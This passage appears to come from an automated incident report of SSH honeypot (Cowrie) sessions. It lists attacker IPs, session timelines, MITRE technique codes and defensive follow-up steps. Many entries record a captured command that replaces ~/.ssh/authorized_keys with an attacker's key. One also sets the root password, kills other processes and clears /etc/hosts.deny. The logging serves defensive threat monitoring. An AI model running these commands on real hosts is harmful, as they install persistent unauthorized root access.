| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:03:42` | `cowrie.session.connect` |
| `2026-05-13 09:03:42` | `cowrie.client.version` |
| `2026-05-13 09:03:43` | `cowrie.client.kex` |
| `2026-05-13 09:03:43` | `cowrie.login.success` |
| `2026-05-13 09:03:44` | `cowrie.session.params` |
| `2026-05-13 09:03:44` | `cowrie.command.input` |
| `2026-05-13 09:03:44` | `cowrie.command.failed` |
| `2026-05-13 09:03:44` | `cowrie.log.closed` |
| `2026-05-13 09:03:44` | `cowrie.session.params` |
| `2026-05-13 09:03:44` | `cowrie.command.input` |
| `2026-05-13 09:03:44` | `cowrie.session.file_download` |
| `2026-05-13 09:03:44` | `cowrie.log.closed` |
| `2026-05-13 09:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.123.150[.]231` to AbuseIPDB if not already reported
- [ ] Block `116.123.150[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f63aec95a7c

| Field | Detail |
|---|---|
| **Source IP** | `116.123.150[.]231` |
| **First Seen** | 2026-05-13 09:03 |
| **Last Seen** | 2026-05-13 09:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:03:46` | `cowrie.session.connect` |
| `2026-05-13 09:03:46` | `cowrie.client.version` |
| `2026-05-13 09:03:46` | `cowrie.client.kex` |
| `2026-05-13 09:03:47` | `cowrie.login.success` |
| `2026-05-13 09:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.123.150[.]231` to AbuseIPDB if not already reported
- [ ] Block `116.123.150[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5ce2354f6b6

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:04 |
| **Last Seen** | 2026-05-13 09:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:04:36` | `cowrie.session.connect` |
| `2026-05-13 09:04:36` | `cowrie.client.version` |
| `2026-05-13 09:04:36` | `cowrie.client.kex` |
| `2026-05-13 09:04:37` | `cowrie.login.success` |
| `2026-05-13 09:04:37` | `cowrie.session.params` |
| `2026-05-13 09:04:37` | `cowrie.command.input` |
| `2026-05-13 09:04:37` | `cowrie.command.failed` |
| `2026-05-13 09:04:37` | `cowrie.log.closed` |
| `2026-05-13 09:04:37` | `cowrie.session.params` |
| `2026-05-13 09:04:37` | `cowrie.command.input` |
| `2026-05-13 09:04:37` | `cowrie.session.file_download` |
| `2026-05-13 09:04:37` | `cowrie.log.closed` |
| `2026-05-13 09:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32146152435

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:04 |
| **Last Seen** | 2026-05-13 09:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:04:39` | `cowrie.session.connect` |
| `2026-05-13 09:04:39` | `cowrie.client.version` |
| `2026-05-13 09:04:39` | `cowrie.client.kex` |
| `2026-05-13 09:04:40` | `cowrie.login.success` |
| `2026-05-13 09:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d6345c4a4a

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:06 |
| **Last Seen** | 2026-05-13 09:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:06:25` | `cowrie.session.connect` |
| `2026-05-13 09:06:25` | `cowrie.client.version` |
| `2026-05-13 09:06:25` | `cowrie.client.kex` |
| `2026-05-13 09:06:26` | `cowrie.login.success` |
| `2026-05-13 09:06:26` | `cowrie.session.params` |
| `2026-05-13 09:06:26` | `cowrie.command.input` |
| `2026-05-13 09:06:26` | `cowrie.command.failed` |
| `2026-05-13 09:06:26` | `cowrie.log.closed` |
| `2026-05-13 09:06:26` | `cowrie.session.params` |
| `2026-05-13 09:06:26` | `cowrie.command.input` |
| `2026-05-13 09:06:26` | `cowrie.session.file_download` |
| `2026-05-13 09:06:26` | `cowrie.log.closed` |
| `2026-05-13 09:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d58a5c1c90

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:06 |
| **Last Seen** | 2026-05-13 09:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:06:28` | `cowrie.session.connect` |
| `2026-05-13 09:06:28` | `cowrie.client.version` |
| `2026-05-13 09:06:28` | `cowrie.client.kex` |
| `2026-05-13 09:06:29` | `cowrie.login.success` |
| `2026-05-13 09:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952e5da5f175

| Field | Detail |
|---|---|
| **Source IP** | `106.13.142[.]171` |
| **First Seen** | 2026-05-13 09:07 |
| **Last Seen** | 2026-05-13 09:08 |
| **Session Duration** | 82s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:yQgzlYax11O6"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:07:15` | `cowrie.session.connect` |
| `2026-05-13 09:07:15` | `cowrie.client.version` |
| `2026-05-13 09:07:15` | `cowrie.client.kex` |
| `2026-05-13 09:07:18` | `cowrie.login.success` |
| `2026-05-13 09:07:20` | `cowrie.session.params` |
| `2026-05-13 09:07:20` | `cowrie.command.input` |
| `2026-05-13 09:07:20` | `cowrie.command.failed` |
| `2026-05-13 09:07:22` | `cowrie.log.closed` |
| `2026-05-13 09:07:22` | `cowrie.session.params` |
| `2026-05-13 09:07:22` | `cowrie.command.input` |
| `2026-05-13 09:07:25` | `cowrie.session.file_download` |
| `2026-05-13 09:07:25` | `cowrie.log.closed` |
| `2026-05-13 09:07:40` | `cowrie.session.params` |
| `2026-05-13 09:07:40` | `cowrie.command.input` |
| `2026-05-13 09:07:40` | `cowrie.log.closed` |
| `2026-05-13 09:07:41` | `cowrie.session.params` |
| `2026-05-13 09:07:41` | `cowrie.command.input` |
| `2026-05-13 09:07:41` | `cowrie.log.closed` |
| `2026-05-13 09:07:43` | `cowrie.session.params` |
| `2026-05-13 09:07:43` | `cowrie.command.input` |
| `2026-05-13 09:07:45` | `cowrie.session.file_download` |
| `2026-05-13 09:07:45` | `cowrie.log.closed` |
| `2026-05-13 09:07:47` | `cowrie.session.params` |
| `2026-05-13 09:07:47` | `cowrie.command.input` |
| `2026-05-13 09:07:47` | `cowrie.log.closed` |
| `2026-05-13 09:07:47` | `cowrie.session.params` |
| `2026-05-13 09:07:47` | `cowrie.command.input` |
| `2026-05-13 09:07:47` | `cowrie.log.closed` |
| `2026-05-13 09:07:50` | `cowrie.session.params` |
| `2026-05-13 09:07:50` | `cowrie.command.input` |
| `2026-05-13 09:07:50` | `cowrie.command.input` |
| `2026-05-13 09:07:52` | `cowrie.log.closed` |
| `2026-05-13 09:07:53` | `cowrie.session.params` |
| `2026-05-13 09:07:53` | `cowrie.command.input` |
| `2026-05-13 09:07:53` | `cowrie.log.closed` |
| `2026-05-13 09:08:06` | `cowrie.session.params` |
| `2026-05-13 09:08:06` | `cowrie.command.input` |
| `2026-05-13 09:08:07` | `cowrie.log.closed` |
| `2026-05-13 09:08:08` | `cowrie.session.params` |
| `2026-05-13 09:08:08` | `cowrie.command.input` |
| `2026-05-13 09:08:10` | `cowrie.log.closed` |
| `2026-05-13 09:08:10` | `cowrie.session.params` |
| `2026-05-13 09:08:10` | `cowrie.command.input` |
| `2026-05-13 09:08:11` | `cowrie.log.closed` |
| `2026-05-13 09:08:12` | `cowrie.session.params` |
| `2026-05-13 09:08:12` | `cowrie.command.input` |
| `2026-05-13 09:08:13` | `cowrie.log.closed` |
| `2026-05-13 09:08:20` | `cowrie.session.params` |
| `2026-05-13 09:08:20` | `cowrie.command.input` |
| `2026-05-13 09:08:20` | `cowrie.log.closed` |
| `2026-05-13 09:08:21` | `cowrie.session.params` |
| `2026-05-13 09:08:21` | `cowrie.command.input` |
| `2026-05-13 09:08:21` | `cowrie.log.closed` |
| `2026-05-13 09:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.142[.]171` to AbuseIPDB if not already reported
- [ ] Block `106.13.142[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83af68cb1118

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:10 |
| **Last Seen** | 2026-05-13 09:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:10:15` | `cowrie.session.connect` |
| `2026-05-13 09:10:15` | `cowrie.client.version` |
| `2026-05-13 09:10:15` | `cowrie.client.kex` |
| `2026-05-13 09:10:15` | `cowrie.login.success` |
| `2026-05-13 09:10:15` | `cowrie.session.params` |
| `2026-05-13 09:10:15` | `cowrie.command.input` |
| `2026-05-13 09:10:15` | `cowrie.command.failed` |
| `2026-05-13 09:10:16` | `cowrie.log.closed` |
| `2026-05-13 09:10:16` | `cowrie.session.params` |
| `2026-05-13 09:10:16` | `cowrie.command.input` |
| `2026-05-13 09:10:16` | `cowrie.session.file_download` |
| `2026-05-13 09:10:16` | `cowrie.log.closed` |
| `2026-05-13 09:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33dbf80869ab

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:10 |
| **Last Seen** | 2026-05-13 09:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:10:18` | `cowrie.session.connect` |
| `2026-05-13 09:10:18` | `cowrie.client.version` |
| `2026-05-13 09:10:18` | `cowrie.client.kex` |
| `2026-05-13 09:10:18` | `cowrie.login.success` |
| `2026-05-13 09:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1d30414d52

| Field | Detail |
|---|---|
| **Source IP** | `124.156.202[.]242` |
| **First Seen** | 2026-05-13 09:11 |
| **Last Seen** | 2026-05-13 09:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:11:28` | `cowrie.session.connect` |
| `2026-05-13 09:11:28` | `cowrie.client.version` |
| `2026-05-13 09:11:29` | `cowrie.client.kex` |
| `2026-05-13 09:11:29` | `cowrie.login.success` |
| `2026-05-13 09:11:29` | `cowrie.session.params` |
| `2026-05-13 09:11:29` | `cowrie.command.input` |
| `2026-05-13 09:11:29` | `cowrie.command.failed` |
| `2026-05-13 09:11:29` | `cowrie.log.closed` |
| `2026-05-13 09:11:29` | `cowrie.session.params` |
| `2026-05-13 09:11:29` | `cowrie.command.input` |
| `2026-05-13 09:11:29` | `cowrie.session.file_download` |
| `2026-05-13 09:11:29` | `cowrie.log.closed` |
| `2026-05-13 09:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.156.202[.]242` to AbuseIPDB if not already reported
- [ ] Block `124.156.202[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038f4c50af27

| Field | Detail |
|---|---|
| **Source IP** | `124.156.202[.]242` |
| **First Seen** | 2026-05-13 09:11 |
| **Last Seen** | 2026-05-13 09:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:11:31` | `cowrie.session.connect` |
| `2026-05-13 09:11:31` | `cowrie.client.version` |
| `2026-05-13 09:11:31` | `cowrie.client.kex` |
| `2026-05-13 09:11:31` | `cowrie.login.success` |
| `2026-05-13 09:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.156.202[.]242` to AbuseIPDB if not already reported
- [ ] Block `124.156.202[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5347ff0da2a

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:12 |
| **Last Seen** | 2026-05-13 09:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:12:12` | `cowrie.session.connect` |
| `2026-05-13 09:12:12` | `cowrie.client.version` |
| `2026-05-13 09:12:12` | `cowrie.client.kex` |
| `2026-05-13 09:12:12` | `cowrie.login.success` |
| `2026-05-13 09:12:12` | `cowrie.session.params` |
| `2026-05-13 09:12:12` | `cowrie.command.input` |
| `2026-05-13 09:12:12` | `cowrie.command.failed` |
| `2026-05-13 09:12:13` | `cowrie.log.closed` |
| `2026-05-13 09:12:13` | `cowrie.session.params` |
| `2026-05-13 09:12:13` | `cowrie.command.input` |
| `2026-05-13 09:12:13` | `cowrie.session.file_download` |
| `2026-05-13 09:12:13` | `cowrie.log.closed` |
| `2026-05-13 09:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37debb801974

| Field | Detail |
|---|---|
| **Source IP** | `103.158.29[.]100` |
| **First Seen** | 2026-05-13 09:12 |
| **Last Seen** | 2026-05-13 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:12:15` | `cowrie.session.connect` |
| `2026-05-13 09:12:15` | `cowrie.client.version` |
| `2026-05-13 09:12:15` | `cowrie.client.kex` |
| `2026-05-13 09:12:15` | `cowrie.login.success` |
| `2026-05-13 09:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.29[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.158.29[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-240c18dbf36d

| Field | Detail |
|---|---|
| **Source IP** | `190.181.4[.]12` |
| **First Seen** | 2026-05-13 09:15 |
| **Last Seen** | 2026-05-13 09:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:15:16` | `cowrie.session.connect` |
| `2026-05-13 09:15:16` | `cowrie.client.version` |
| `2026-05-13 09:15:16` | `cowrie.client.kex` |
| `2026-05-13 09:15:18` | `cowrie.login.success` |
| `2026-05-13 09:15:19` | `cowrie.session.params` |
| `2026-05-13 09:15:19` | `cowrie.command.input` |
| `2026-05-13 09:15:19` | `cowrie.command.failed` |
| `2026-05-13 09:15:19` | `cowrie.log.closed` |
| `2026-05-13 09:15:20` | `cowrie.session.params` |
| `2026-05-13 09:15:20` | `cowrie.command.input` |
| `2026-05-13 09:15:20` | `cowrie.session.file_download` |
| `2026-05-13 09:15:20` | `cowrie.log.closed` |
| `2026-05-13 09:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.4[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.181.4[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a8d8d9d256

| Field | Detail |
|---|---|
| **Source IP** | `190.181.4[.]12` |
| **First Seen** | 2026-05-13 09:15 |
| **Last Seen** | 2026-05-13 09:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 09:15:24` | `cowrie.session.connect` |
| `2026-05-13 09:15:24` | `cowrie.client.version` |
| `2026-05-13 09:15:24` | `cowrie.client.kex` |
| `2026-05-13 09:15:26` | `cowrie.login.success` |
| `2026-05-13 09:15:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.4[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.181.4[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8196824a70d5

| Field | Detail |
|---|---|
